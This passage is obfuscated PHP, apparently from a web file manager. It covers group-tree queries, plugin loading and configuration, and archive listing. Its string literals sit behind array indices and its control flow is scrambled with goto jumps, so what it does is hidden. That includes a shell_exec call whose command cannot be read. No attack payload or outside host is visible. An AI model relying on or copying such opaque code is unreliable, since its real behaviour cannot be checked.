$F¡Õ£¨ªÇË; goto A ê¦Ø‰Ùí; A ê¦Ø‰Ùí: } private function _searchFromMeta($f¿‡¦õÆ, $f‰ƒ½ë²²ë, $fÑÊ¨ìƒö) { goto bÕ×ö‰Í¸å; Då¾è˜Ç©: $bíÀ˜‹ø¬ = $this->where(array($AîÄ¯îà[2152] => array($AîÄ¯îà[7], $F¸ïìç…Ûß)))->select(); if (!$bíÀ˜‹ø¬) { return array(); } return $bíÀ˜‹ø¬; goto CëÍ¦–; C•Ïõ…èÖŠ: $F¸ïìç…Ûß = Model($AîÄ¯îà[2161])->where($A¢Í‡àğ„)->limit($fÑÊ¨ìƒö)->select(); if (!$F¸ïìç…Ûß) { return array(); } $F¸ïìç…Ûß = array_to_keyvalue($F¸ïìç…Ûß, $AîÄ¯îà[33], $AîÄ¯îà[2080]); goto Då¾è˜Ç©; bÕ×ö‰Í¸å: $AîÄ¯îà =& $_SERVER[Õİõş]; $f‰ƒ½ë²²ë = strtolower($f‰ƒ½ë²²ë); $A¢Í‡àğ„ = array($AîÄ¯îà[89] => $f¿‡¦õÆ, $AîÄ¯îà[355] => array($AîÄ¯îà[753], "\x25{$f‰ƒ½ë²²ë}\x25")); goto C•Ïõ…èÖŠ; CëÍ¦–: } protected function _listDataApplyItem($EÙ÷‰ÂŒàÊ) { $B Îæ…°Æ = array($EÙ÷‰ÂŒàÊ); $this->_listDataApply($B Îæ…°Æ); return $B Îæ…°Æ[0]; } protected function _listDataApply(&$E¢œà´ÁÊÕ) { goto f¿«õì›ŞÂ; f¿«õì›ŞÂ: $AóºÙ‘Ä =& $_SERVER[Õİõş]; if (!$E¢œà´ÁÊÕ) { return; } $F‘ˆÃ­É„ù = array_to_keyvalue($E¢œà´ÁÊÕ, $AóºÙ‘Ä[33], $AóºÙ‘Ä[2080]); goto B‹À©ƒÔŒÏ; B²Ú–ªóá: $this->_listAppendParent($E¢œà´ÁÊÕ); $this->_listAppendSourceRoot($E¢œà´ÁÊÕ, $F‘ˆÃ­É„ù); goto bÃÈáØ‘¡Û; B‹À©ƒÔŒÏ: $this->_listAppendChildren($E¢œà´ÁÊÕ); $this->_listAppendChildrenMember($E¢œà´ÁÊÕ); $this->_listAppendMeta($E¢œà´ÁÊÕ, $F‘ˆÃ­É„ù); goto B²Ú–ªóá; bÃÈáØ‘¡Û: } private function _listAppendChildren(&$B•—·ÑÎÇ) { goto dæŒŸ‹»‚¾; dæŒŸ‹»‚¾: $CÜ±ôÌŠÆÕ =& $_SERVER[Õİõş]; $Fó¶Öœµˆ  = $CÜ±ôÌŠÆÕ[357]; $F¢ö‹ë¿ = array(); goto E÷·á«¦³; E÷·á«¦³: $A¡´åÂÉŸÊ = count($B•—·ÑÎÇ); $Dƒ ®Åà–æ = $this->tablePrefix . $this->tableName; for ($cÌ™ˆ÷ê›• = 0, $FÇìğãÓ¢§ = 0; $cÌ™ˆ÷ê›• < $A¡´åÂÉŸÊ; $cÌ™ˆ÷ê›•++) { $FÇìğãÓ¢§++; $A¶îà¶¼Èç = $B•—·ÑÎÇ[$cÌ™ˆ÷ê›•][$CÜ±ôÌŠÆÕ[2080]]; $Fó¶Öœµˆ  .= "\123\x45\114\x45\103\124\x20\52\40\x46\122\x4f\x4d\x20\50\x53\x45\114\105\103\124\x20\x27{$A¶îà¶¼Èç}\x5f\143\150\x69\x6c\x64\x27\x20\141\163\40\x68\x61\163\x20\x46\122\117\115\40\x60{$Dƒ ®Åà–æ}\x60\40\x77\150\x65\x72\x65\x20\x70\141\162\x65\156\x74\x49\x44\75{$A¶îà¶¼Èç}\x20\154\x69\155\151\x74\x20\61\x29\x20\141\163\x20\164\x62\x5f{$A¶îà¶¼Èç}\x20\x75\156\x69\x6f\156\40\x61\154\154\40"; if (($FÇìğãÓ¢§ >= 20 || $cÌ™ˆ÷ê›• == $A¡´åÂÉŸÊ - 1) && $Fó¶Öœµˆ ) { $Fó¶Öœµˆ  = substr($Fó¶Öœµˆ , 0, -strlen($CÜ±ôÌŠÆÕ[444])); $EíİÄ‰ÍÚ = $this->query($Fó¶Öœµˆ ); $F¢ö‹ë¿ = array_merge($F¢ö‹ë¿, $EíİÄ‰ÍÚ); $FÇìğãÓ¢§ = 0; $Fó¶Öœµˆ  = $CÜ±ôÌŠÆÕ[33]; } } goto Dç„´…ÕŠì; Dç„´…ÕŠì: $F¢ö‹ë¿ = array_to_keyvalue($F¢ö‹ë¿, $CÜ±ôÌŠÆÕ[445]); foreach ($B•—·ÑÎÇ as &$F° ôÖÆÇ) { $F° ôÖÆÇ[$CÜ±ôÌŠÆÕ[2162]] = isset($F¢ö‹ë¿[$F° ôÖÆÇ[$CÜ±ôÌŠÆÕ[2080]] . $CÜ±ôÌŠÆÕ[2163]]); } goto dÀŠàŒìÓ¡; dÀŠàŒìÓ¡: } private function _listAppendChildrenMember(&$Aâ²‡á¤ô) { goto f¨ÛË•ÊÅ¦; F´ìÔ«ì½Û: $E—‡‡á¬ÛÀ = array_to_keyvalue($E—‡‡á¬ÛÀ, $F¾ŸÀ¸­[445]); foreach ($Aâ²‡á¤ô as &$AÀ–À®·É™) { $AÀ–À®·É™[$F¾ŸÀ¸­[2164]] = isset($E—‡‡á¬ÛÀ[$AÀ–À®·É™[$F¾ŸÀ¸­[2080]] . $F¾ŸÀ¸­[2163]]); } goto d›Ø¹ï£ˆ; f¨ÛË•ÊÅ¦: $F¾ŸÀ¸­ =& $_SERVER[Õİõş]; $B¶Á˜—õ¦ = $F¾ŸÀ¸­[357]; $E—‡‡á¬ÛÀ = array(); goto e¢“Ô°ƒŸ£; e¢“Ô°ƒŸ£: $c…ƒ¢‡¾ËÚ = count($Aâ²‡á¤ô); $cÅÛ¥³Ûå· = $this->tablePrefix . $F¾ŸÀ¸­[2154]; for ($FËõ „§Şö = 0, $f¡±©çÇ° = 0; $FËõ „§Şö < $c…ƒ¢‡¾ËÚ; $FËõ „§Şö++) { $f¡±©çÇ°++; $DˆÆ·Ç†•ç = $Aâ²‡á¤ô[$FËõ „§Şö][$F¾ŸÀ¸­[2080]]; $B¶Á˜—õ¦ .= "\x53\x45\114\x45\x43\x54\x20\52\40\106\x52\117\x4d\40\x28\123\x45\x4c\105\x43\x54\40\47{$DˆÆ·Ç†•ç}\x5f\143\150\x69\x6c\144\x27\x20\x61\x73\x20\150\141\163\x20\x46\x52\x4f\x4d\x20\x60{$cÅÛ¥³Ûå·}\x60\x20\167\150\x65\162\x65\x20\147\162\157\x75\x70\x49\104\75{$DˆÆ·Ç†•ç}\x20\154\x69\155\x69\x74\x20\x31\51\x20\x61\x73\40\x74\142\x5f{$DˆÆ·Ç†•ç}\40\x75\x6e\x69\x6f\x6e\x20\141\154\x6c\x20"; if (($f¡±©çÇ° >= 20 || $FËõ „§Şö == $c…ƒ¢‡¾ËÚ - 1) && $B¶Á˜—õ¦) { $B¶Á˜—õ¦ = substr($B¶Á˜—õ¦, 0, -strlen($F¾ŸÀ¸­[444])); $fÜ™ùÅ¼˜¾ = $this->query($B¶Á˜—õ¦); $E—‡‡á¬ÛÀ = array_merge($E—‡‡á¬ÛÀ, $fÜ™ùÅ¼˜¾); $f¡±©çÇ° = 0; $B¶Á˜—õ¦ = $F¾ŸÀ¸­[33]; } } goto F´ìÔ«ì½Û; d›Ø¹ï£ˆ: } private function _listAppendMeta(&$FîéëÌ¢¾, $Cö¸òÙ„·) { $fÆÚé„ƒÈ =& $_SERVER[Õİõş]; $D™Í°‡ÍÁ = array($fÆÚé„ƒÈ[2080] => array($fÆÚé„ƒÈ[7], $Cö¸òÙ„·)); $F–²†ã¥…Û = Model($fÆÚé„ƒÈ[2153])->where($D™Í°‡ÍÁ)->select(); $F–²†ã¥…Û = array_to_keyvalue_group($F–²†ã¥…Û, $fÆÚé„ƒÈ[2080]); foreach ($F–²†ã¥…Û as &$b¢Œ­Ğƒ¹İ) { $b¢Œ­Ğƒ¹İ = array_to_keyvalue($b¢Œ­Ğƒ¹İ, $fÆÚé„ƒÈ[89], $fÆÚé„ƒÈ[355]); } foreach ($FîéëÌ¢¾ as &$a¨Úì‹å²) { $a¨Úì‹å²[$fÆÚé„ƒÈ[412]] = array(); if (isset($F–²†ã¥…Û[$a¨Úì‹å²[$fÆÚé„ƒÈ[2080]]])) { $a¨Úì‹å²[$fÆÚé„ƒÈ[412]] = $F–²†ã¥…Û[$a¨Úì‹å²[$fÆÚé„ƒÈ[2080]]]; } } } protected function parentLevelArray($FËĞ–……øÀ) { $f²’ µëõ° =& $_SERVER[Õİõş]; $FËĞ–……øÀ = explode($f²’ µëõ°[47], trim($FËĞ–……øÀ, $f²’ µëõ°[47])); $FËĞ–……øÀ = array_remove_value($FËĞ–……øÀ, $f²’ µëõ°[463]); return $FËĞ–……øÀ; } private function _listAppendParent(&$fçÇ²¼ù°Ï) { goto e…¡à¿¼Îˆ; F„‡Ëô˜ÎÒ: foreach ($fçÇ²¼ù°Ï as &$CÌÊÄÖµÛø) { $f„”ìÄ£Ö¬ = $this->parentLevelArray($CÌÊÄÖµÛø[$aä–À‹Ğ¹[454]]); $EˆÜó´—È = $aä–À‹Ğ¹[33]; foreach ($f„”ìÄ£Ö¬ as $a¡óÃ¸ôãª) { $EˆÜó´—È .= $e‘³ÛŞ–Ã[$a¡óÃ¸ôãª] . $aä–À‹Ğ¹[8]; } if ($f„”ìÄ£Ö¬) { $EˆÜó´—È .= $CÌÊÄÖµÛø[$aä–À‹Ğ¹[28]]; } $CÌÊÄÖµÛø[$aä–À‹Ğ¹[458]] = str_replace($aä–À‹Ğ¹[462], $aä–À‹Ğ¹[8], $EˆÜó´—È); } goto CÚ»ùäö™Ã; E›îŠíœ‘Î: $d³‰ò÷‡Ò = array(); foreach ($e‘³ÛŞ–Ã as $aÌ¬„ ‡ˆ => $b¥¶Î…ªï) { if (!$b¥¶Î…ªï) { $d³‰ò÷‡Ò[] = $aÌ¬„ ‡ˆ; } } if ($d³‰ò÷‡Ò) { $f½ªòäî = array($aä–À‹Ğ¹[2152] => array($aä–À‹Ğ¹[380], $d³‰ò÷‡Ò)); $D˜°ªØ›ÌÚ = $this->field($aä–À‹Ğ¹[2165])->where($f½ªòäî)->select(); $f¥ÏÖ”ÛƒÑ = array_to_keyvalue($D˜°ªØ›ÌÚ, $aä–À‹Ğ¹[2080], $aä–À‹Ğ¹[28]); $e‘³ÛŞ–Ã = array_merge_index($e‘³ÛŞ–Ã, $f¥ÏÖ”ÛƒÑ); } goto F„‡Ëô˜ÎÒ; e…¡à¿¼Îˆ: $aä–À‹Ğ¹ =& $_SERVER[Õİõş]; $e‘³ÛŞ–Ã = array(); foreach ($fçÇ²¼ù°Ï as &$CÌÊÄÖµÛø) { $e‘³ÛŞ–Ã[$CÌÊÄÖµÛø[$aä–À‹Ğ¹[2080]]] = $CÌÊÄÖµÛø[$aä–À‹Ğ¹[28]]; $f„”ìÄ£Ö¬ = $this->parentLevelArray($CÌÊÄÖµÛø[$aä–À‹Ğ¹[454]]); foreach ($f„”ìÄ£Ö¬ as $a¡óÃ¸ôãª) { if (!isset($e‘³ÛŞ–Ã[$a¡óÃ¸ôãª])) { $e‘³ÛŞ–Ã[$a¡óÃ¸ôãª] = 0; } } } goto E›îŠíœ‘Î; CÚ»ùäö™Ã: } private function _listAppendSourceRoot(&$FÒğ‰Íç„¦, $FÙ“ÓØ”÷ï) { goto A¬¶‰Ÿ·Õ; A¬¶‰Ÿ·Õ: $E¬Ğˆªí¤ =& $_SERVER[Õİõş]; $e‡îËëâ¼Ì = array($E¬Ğˆªí¤[367] => SourceModel::TYPE_GROUP, $E¬Ğˆªí¤[456] => 0, $E¬Ğˆªí¤[451] => array($E¬Ğˆªí¤[7], $FÙ“ÓØ”÷ï)); $b®õôï¤ = $E¬Ğˆªí¤[2166]; goto EšÒßªŠŸš; EšÒßªŠŸš: $cƒ£‹‚·¸† = Model($E¬Ğˆªí¤[754])->order($E¬Ğˆªí¤[2167])->field($b®õôï¤)->where($e‡îËëâ¼Ì)->select(); $cƒ£‹‚·¸† = array_to_keyvalue($cƒ£‹‚·¸†, $E¬Ğˆªí¤[451]); $cƒ£‹‚·¸† = array_remove_key($cƒ£‹‚·¸†, $E¬Ğˆªí¤[451]); goto E®êÂÚùÕÎ; E®êÂÚùÕÎ: foreach ($FÒğ‰Íç„¦ as &$D‰âöŸ§í) { $D‰âöŸ§í[$E¬Ğˆªí¤[387]] = $cƒ£‹‚·¸†[$D‰âöŸ§í[$E¬Ğˆªí¤[2080]]] ? $cƒ£‹‚·¸†[$D‰âöŸ§í[$E¬Ğˆªí¤[2080]]] : array(); } goto EÉ¥”ã²–Ã; EÉ¥”ã²–Ã: } protected function resetParentLevel() { $C½êñ†ÑšÏ =& $_SERVER[Õİõş]; $C›ËË„»Œ = $C½êñ†ÑšÏ[2080]; $fÆîÍ”÷à‘ = $this->select(); $fÆîÍ”÷à‘ = array_to_keyvalue($fÆîÍ”÷à‘, $C›ËË„»Œ); foreach ($fÆîÍ”÷à‘ as $b¹…Ñ¬Ñ”) { goto BÍ­Ş…¹—ò; F©ˆ­ÙŒõÁ: $d¥¢›†Ì¦[] = 0; $d¥¢›†Ì¦ = $C½êñ†ÑšÏ[47] . implode($C½êñ†ÑšÏ[47], array_reverse($d¥¢›†Ì¦)) . $C½êñ†ÑšÏ[47]; $this->setNamePinyin($b¹…Ñ¬Ñ”[$C›ËË„»Œ], $b¹…Ñ¬Ñ”[$C½êñ†ÑšÏ[28]]); goto c½ßêğ¯Ãæ; BÍ­Ş…¹—ò: $BÄ¤Š”¼Ö­ = $b¹…Ñ¬Ñ”; $d¥¢›†Ì¦ = array(); while ($BÄ¤Š”¼Ö­[$C½êñ†ÑšÏ[456]] != 0) { $d¥¢›†Ì¦[] = $BÄ¤Š”¼Ö­[$C½êñ†ÑšÏ[456]]; $BÄ¤Š”¼Ö­ = $fÆîÍ”÷à‘[$BÄ¤Š”¼Ö­[$C½êñ†ÑšÏ[456]]]; } goto F©ˆ­ÙŒõÁ; c½ßêğ¯Ãæ: $this->where(array($C›ËË„»Œ => $b¹…Ñ¬Ñ”[$C›ËË„»Œ]))->save(array($C½êñ†ÑšÏ[520] => $d¥¢›†Ì¦)); goto f¤Êµ¤Õ¡‹; f¤Êµ¤Õ¡‹: } return $fÆîÍ”÷à‘; } public function groupNameAuto($eóËõˆˆäè, $aÇƒ†İŠ‹Ö) { $BÈŞáÁĞ’ =& $_SERVER[Õİõş]; $DäçŒßÎ— = $this->where(array($BÈŞáÁĞ’[364] => $eóËõˆˆäè))->getField($BÈŞáÁĞ’[28], !0); if (!$DäçŒßÎ— || !in_array($aÇƒ†İŠ‹Ö, $DäçŒßÎ—)) { return $aÇƒ†İŠ‹Ö; } for ($CÉÜô÷«î„ = 1; $CÉÜô÷«î„ <= count($DäçŒßÎ—) + 1; $CÉÜô÷«î„++) { $c‘ñ‚…Äõ = $aÇƒ†İŠ‹Ö . "\50{$CÉÜô÷«î„}\x29"; if (!in_array($c‘ñ‚…Äõ, $DäçŒßÎ—)) { return $c‘ñ‚…Äõ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x70\154\x75\x67\151\x6e\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\163\164\141\x74\x75\163", "\162\145\x67\151\x65\163\x74", "\143\x6f\156\x66\x69\147"); public function loadList($F‚ï Ü¾¯ = false) { $CÇ‹…‰Œˆœ = array_to_keyvalue($this->listData(), $_SERVER[Õİõş][28]); if ($F‚ï Ü¾¯) { return $CÇ‹…‰Œˆœ[$F‚ï Ü¾¯]; } return $CÇ‹…‰Œˆœ; } public function init() { $F¤©§’Ïïğ =& $_SERVER[Õİõş]; Hook::trigger($F¤©§’Ïïğ[2168]); $b¾ÕÉˆèÌª = $this->loadPluginList(); foreach ($b¾ÕÉˆèÌª as $f¶¾‹“¹‘ => $F„ŒÉ„—ÖÚ) { $c°†‡»‡ˆ = $this->appAllow($f¶¾‹“¹‘, $F„ŒÉ„—ÖÚ); if (!$c°†‡»‡ˆ) { continue; } foreach ($F„ŒÉ„—ÖÚ[$F¤©§’Ïïğ[2169]] as $A²Ïö‚œ…ô => $AÕô…ãÜ­Ú) { Hook::bind($A²Ïö‚œ…ô, $AÕô…ãÜ­Ú); } } Hook::trigger($F¤©§’Ïïğ[2170]); Hook::trigger(ACTION); } public function appAllow($f‰¿Û—Ó™ø, $dÊ°’ø¹, $fíµ‘¦Å¼» = true) { $a¡‡ùºù­È =& $_SERVER[Õİõş]; $d¯¿ò—«ï = PLUGIN_DIR . $f‰¿Û—Ó™ø . $a¡‡ùºù­È[2171]; if (!is_array($dÊ°’ø¹) || !is_array($dÊ°’ø¹[$a¡‡ùºù­È[2169]]) || !is_file($d¯¿ò—«ï) || $dÊ°’ø¹[$a¡‡ùºù­È[691]] != 1) { return !1; } if ($fíµ‘¦Å¼» && !Action($a¡‡ùºù­È[2172])->checkAuth($f‰¿Û—Ó™ø)) { return !1; } return !0; } public function unInstall($dğ¿‡ä§) { $dŠÕ·İá =& $_SERVER[Õİõş]; $BÏîšß¦©À = $this->loadList($dğ¿‡ä§); if (file_exists(PLUGIN_DIR . $dğ¿‡ä§)) { Hook::apply($dğ¿‡ä§ . $dŠÕ·İá[2173]); } $this->remove($BÏîšß¦©À[$dŠÕ·İá[363]]); } public function changeStatus($C½¬Úö”ÀÃ, $CØãÊ£·§„) { $C–ñ–‹™É =& $_SERVER[Õİõş]; $cº’ù‚è«° = $this->loadList($C½¬Úö”ÀÃ); if ($CØãÊ£·§„) { Hook::apply($C½¬Úö”ÀÃ . $C–ñ–‹™É[2174]); } $this->update($cº’ù‚è«°[$C–ñ–‹™É[363]], array($C–ñ–‹™É[2175] => $CØãÊ£·§„)); } public function appRegist($dÆÔš‚ßÅñ, $aìá­”‡âå) { $E¨¦¯ºí×› =& $_SERVER[Õİõş]; $fÓ‰³É–Ø‡ = $this->loadList($dÆÔš‚ßÅñ); if ($fÓ‰³É–Ø‡) { $this->update($fÓ‰³É–Ø‡[$E¨¦¯ºí×›[363]], array($E¨¦¯ºí×›[2169] => $aìá­”‡âå)); } else { $cáÍ²ÈÑ = array($E¨¦¯ºí×›[28] => $dÆÔš‚ßÅñ, $E¨¦¯ºí×›[2169] => $aìá­”‡âå, $E¨¦¯ºí×›[691] => 0, $E¨¦¯ºí×›[6] => $this->getConfigDefault($dÆÔš‚ßÅñ)); $this->insert($cáÍ²ÈÑ); } } public function getConfigDefault($dÔëÏ¥õƒ‰) { $eÑİ»øš¦Ñ =& $_SERVER[Õİõş]; $eÇ°·Šõâ‘ = array(); $C°ËšÇĞ‚² = $this->getPackageJson($dÔëÏ¥õƒ‰); if (!$C°ËšÇĞ‚² && is_array($C°ËšÇĞ‚²[$eÑİ»øš¦Ñ[2176]])) { return $eÇ°·Šõâ‘; } foreach ($C°ËšÇĞ‚²[$eÑİ»øš¦Ñ[2176]] as $bçÆ¬ Šä => $Cëöº¿¶‚Ê) { if (!isset($Cëöº¿¶‚Ê[$eÑİ»øš¦Ñ[355]]) || isset($eÇ°·Šõâ‘[$bçÆ¬ Šä])) { continue; } $eÇ°·Šõâ‘[$bçÆ¬ Šä] = $Cëöº¿¶‚Ê[$eÑİ»øš¦Ñ[355]]; } return $eÇ°·Šõâ‘; } public function getPackageJson($bãÊƒÄÅâÑ) { return Hook::apply($bãÊƒÄÅâÑ . $_SERVER[Õİõş][2177]); } public function getConfig($e‚ŒÏÛÎİÒ, $dÚ±¾˜äÑÂ = false) { $Eš°¸èõÊ =& $_SERVER[Õİõş]; $Cù’Å’°îÖ = array(); $DĞ×©œ†áã = $this->loadList($e‚ŒÏÛÎİÒ); if ($DĞ×©œ†áã && is_array($DĞ×©œ†áã[$Eš°¸èõÊ[6]])) { $Cù’Å’°îÖ = $DĞ×©œ†áã[$Eš°¸èõÊ[6]]; } if (!$Cù’Å’°îÖ || $dÚ±¾˜äÑÂ) { $Cù’Å’°îÖ = $this->getConfigDefault($e‚ŒÏÛÎİÒ); } return $Cù’Å’°îÖ; } public function setConfig($EŒ¦á¤…‚, $B¶µÆİòÛ = false) { goto bÂ¹ùø÷ß‘; bÂ¹ùø÷ß‘: $bĞ·ŠŞØ«Ù =& $_SERVER[Õİõş]; $d©œëİËÈ = $this->loadList($EŒ¦á¤…‚); if (!$d©œëİËÈ) { return !1; } goto B‚“³Ãç†; cÜÆÍóóÀÏ: $this->update($d©œëİËÈ[$bĞ·ŠŞØ«Ù[363]], array($bĞ·ŠŞØ«Ù[6] => $FßÖ¨ò‘®)); goto AøšÔæö×‹; B‚“³Ãç†: if ($B¶µÆİòÛ == !1) { $B¶µÆİòÛ = $this->getConfigDefault($EŒ¦á¤…‚); } $FßÖ¨ò‘® = $d©œëİËÈ[$bĞ·ŠŞØ«Ù[6]]; foreach ($B¶µÆİòÛ as $E±ÁåªøÏ => $DÍ®à…åà) { $FßÖ¨ò‘®[$E±ÁåªøÏ] = is_string($DÍ®à…åà) ? trim($DÍ®à…åà) : $DÍ®à…åà; } goto cÜÆÍóóÀÏ; AøšÔæö×‹: } public function viewList() { goto bí«ŸŠ¦ö; bí«ŸŠ¦ö: $A®åïŸØÓ =& $_SERVER[Õİõş]; $d‘½à˜Š« = $this->loadList(); $this->pluginScan($d‘½à˜Š«); goto eá½æ—„˜ˆ; eá½æ—„˜ˆ: $d‘½à˜Š« = $this->loadPluginList(); $BÊèÕõãÌ = array(); foreach ($d‘½à˜Š« as $D¾ÒæçÌ® => $Cí…Øµ‘›×) { unset($Cí…Øµ‘›×[$A®åïŸØÓ[2169]], $Cí…Øµ‘›×[$A®åïŸØÓ[6]]); $C·Ë™ÛÃÎ = PLUGIN_DIR . $Cí…Øµ‘›×[$A®åïŸØÓ[28]] . $A®åïŸØÓ[2171]; if (!is_file($C·Ë™ÛÃÎ)) { continue; } $BŠ¿åß†óã = Hook::apply($Cí…Øµ‘›×[$A®åïŸØÓ[28]] . $A®åïŸØÓ[2177]); if (is_array($BŠ¿åß†óã)) { $BÊèÕõãÌ[$D¾ÒæçÌ®] = array_merge($Cí…Øµ‘›×, $BŠ¿åß†óã); } } goto e‰éïÙ¦“Š; e‰éïÙ¦“Š: return $BÊèÕõãÌ; goto EÀ‚¯Şóã; EÀ‚¯Şóã: } private function loadPluginList() { $D¸¨”¸Ç‰ =& $_SERVER[Õİõş]; $C„¦˜ÛÃò¾ = $this->loadList(); if (strtolower(MOD) == $D¸¨”¸Ç‰[2178]) { return $C„¦˜ÛÃò¾; } $a‚Ã¯ïÏ¼ = Hook::trigger($D¸¨”¸Ç‰[2179], $C„¦˜ÛÃò¾); if ($C„¦˜ÛÃò¾ && !$a‚Ã¯ïÏ¼) { die; } return $a‚Ã¯ïÏ¼ ? $a‚Ã¯ïÏ¼ : $C„¦˜ÛÃò¾; } private function pluginScan($f‡ï™‡Œ‚‚) { $f‡¬Ô±¥·… =& $_SERVER[Õİõş]; recursion_dir(PLUGIN_DIR, $d£ÑßÙÇã, $b’¯ˆô¼Î˜, 0); foreach ($d£ÑßÙÇã as $a¦¥£„Æ) { $Då¤òÔùñ = get_path_this($a¦¥£„Æ); if (isset($f‡ï™‡Œ‚‚[$Då¤òÔùñ]) || !file_exists($a¦¥£„Æ . $f‡¬Ô±¥·…[2180]) || !file_exists($a¦¥£„Æ . $f‡¬Ô±¥·…[2171])) { continue; } Hook::apply($Då¤òÔùñ . $f‡¬Ô±¥·…[2174]); } } } goto F£Àëƒ‰×‚; E‹ÔŒé­¹‚: class KodArchive { static function init() { goto aÁŒ•ùÉ; AÈ³ãœùë: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1868]; require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1869]; goto A Ëµ®œÒè; aÁŒ•ùÉ: $f¶®ˆ”Ìš° =& $_SERVER[Õİõş]; if (defined($f¶®ˆ”Ìš°[1862])) { return; } define($f¶®ˆ”Ìš°[1862], SDK_DIR . $f¶®ˆ”Ìš°[1863]); goto DĞ™Œ“ëÍ; A Ëµ®œÒè: require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1870]; require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1871]; require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1872]; goto fŞ…ëÈ¯¬„; fŞ…ëÈ¯¬„: require_once ARCHIVE_LIB . $f¶®ˆ”Ìš°[1873]; goto DÒïœÀœÀ´; DĞ™Œ“ëÍ: define($f¶®ˆ”Ìš°[1864], TEMP_FILES); define($f¶®ˆ”Ìš°[1865], TEMP_FILES); define($f¶®ˆ”Ìš°[1866], $f¶®ˆ”Ìš°[1867]); goto AÈ³ãœùë; DÒïœÀœÀ´: } static function checkIfType($bá«„Ù¿‹İ, $dÛŠß«‚™) { goto a¦Ì÷Ê‚°à; EÛ”å‘â…÷: return $c¹´‰ë°¾¶; goto b…ç¤í²œç; a¦Ì÷Ê‚°à: $eïªëÚ¡·İ =& $_SERVER[Õİõş]; self::init(); $Bç®”å„´³ = array($eïªëÚ¡·İ[297] => array($eïªëÚ¡·İ[297], $eïªëÚ¡·İ[1874], $eïªëÚ¡·İ[1875], $eïªëÚ¡·İ[1876]), $eïªëÚ¡·İ[1877] => array($eïªëÚ¡·İ[1877], $eïªëÚ¡·İ[1878], $eïªëÚ¡·İ[1046], $eïªëÚ¡·İ[1044]), $eïªëÚ¡·İ[1048] => array($eïªëÚ¡·İ[1048], $eïªëÚ¡·İ[1879], $eïªëÚ¡·İ[1880], $eïªëÚ¡·İ[1881], $eïªëÚ¡·İ[1882], $eïªëÚ¡·İ[1883], $eïªëÚ¡·İ[1884])); goto E¹šÍ‚Ô–…; E¹šÍ‚Ô–…: $c¹´‰ë°¾¶ = in_array($bá«„Ù¿‹İ, $Bç®”å„´³[$dÛŠß«‚™]); if ($c¹´‰ë°¾¶ && ($dÛŠß«‚™ == $eïªëÚ¡·İ[297] || $dÛŠß«‚™ == $eïªëÚ¡·İ[1877]) && (!function_exists($eïªëÚ¡·İ[1885]) || !function_exists($eïªëÚ¡·İ[1886]))) { show_tips($eïªëÚ¡·İ[1887]); } if ($c¹´‰ë°¾¶ && $dÛŠß«‚™ == $eïªëÚ¡·İ[1048] && (!function_exists($eïªëÚ¡·İ[1888]) || !strstr(shell_exec($eïªëÚ¡·İ[1889]), $eïªëÚ¡·İ[1890]))) { show_tips($eïªëÚ¡·İ[1891]); } goto EÛ”å‘â…÷; b…ç¤í²œç: } static function listContent($BØñğª—›¶, $E¶•˜‘ˆ¹¼ = true) { $e½ŸñÏ¼æÆ =& $_SERVER[Õİõş]; self::init(); $A“âÉ¥‰Š£ = !empty($GLOBALS[$e½ŸñÏ¼æÆ[1052]]) ? $GLOBALS[$e½ŸñÏ¼æÆ[1052]] : get_path_ext($BØñğª—›¶); $b°’’±¨’º = !1; if (self::checkIfType($A“âÉ¥‰Š£, $e½ŸñÏ¼æÆ[1877])) { $Eğ…Ëƒóî = PclTarList($BØñğª—›¶, $A“âÉ¥‰Š£); $b°’’±¨’º = array(); for ($BÉÊİÆ§Óó = 0; $BÉÊİÆ§Óó < count($Eğ…Ëƒóî); $BÉÊİÆ§Óó++) { $a®­‡Ù¹ˆÏ = $Eğ…Ëƒóî[$BÉÊİÆ§Óó]; if ($a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1892]] == $e½ŸñÏ¼æÆ[1893] || $a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1892]] == $e½ŸñÏ¼æÆ[1894]) { continue; } if ($E¶•˜‘ˆ¹¼) { $a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1895]] = ltrim($a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1895]], $e½ŸñÏ¼æÆ[1150]); } if ($a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1892]] == $e½ŸñÏ¼æÆ[1896]) { $a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[76]] = !0; } else { $a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[76]] = !1; } $a®­‡Ù¹ˆÏ[$e½ŸñÏ¼æÆ[1039]] = $BÉÊİÆ§Óó; $b°’’±¨’º[] = $a®­‡Ù¹ˆÏ; } } else { if (self::checkIfType($A“âÉ¥‰Š£, $e½ŸñÏ¼æÆ[1048])) { $FÙ§©Ùí¯´ = kodRarArchive::listContent($BØñğª—›¶); if (!$FÙ§©Ùí¯´[$e½ŸñÏ¼æÆ[1035]]) { return $FÙ§©Ùí¯´; } else { $b°’’±¨’º = $FÙ§©Ùí¯´[$e½ŸñÏ¼æÆ[1037]]; } } else { if (kodZipArchive::support($e½ŸñÏ¼æÆ[350])) { $b°’’±¨’º = kodZipArchive::listContent($BØñğª—›¶); } else { $AÍĞñ÷æã = new PclZip($BØñğª—›¶); $b°’’±¨’º = $AÍĞñ÷æã->listContent(); } } } if ($b°’’±¨’º) { $a×ç¢³¸ºƒ = unzip_charset_get($b°’’±¨’º); $E¶•˜‘ˆ¹¼ = $E¶•˜‘ˆ¹¼ && function_exists($e½ŸñÏ¼æÆ[65]); for ($BÉÊİÆ§Óó = 0; $BÉÊİÆ§Óó < count($b°’’±¨’º); $BÉÊİÆ§Óó++) { $b°’’±¨’º[$BÉÊİÆ§Óó][$e½ŸñÏ¼æÆ[1895]] = str_replace(array($e½ŸñÏ¼æÆ[1075], $e½ŸñÏ¼æÆ[1897]), $e½ŸñÏ¼æÆ[772], $b°’’±¨’º[$BÉÊİÆ§Óó][$e½ŸñÏ¼æÆ[1895]]); if ($E¶•˜‘ˆ¹¼) { $b°’’±¨’º[$BÉÊİÆ§Óó][$e½ŸñÏ¼æÆ[1895]] 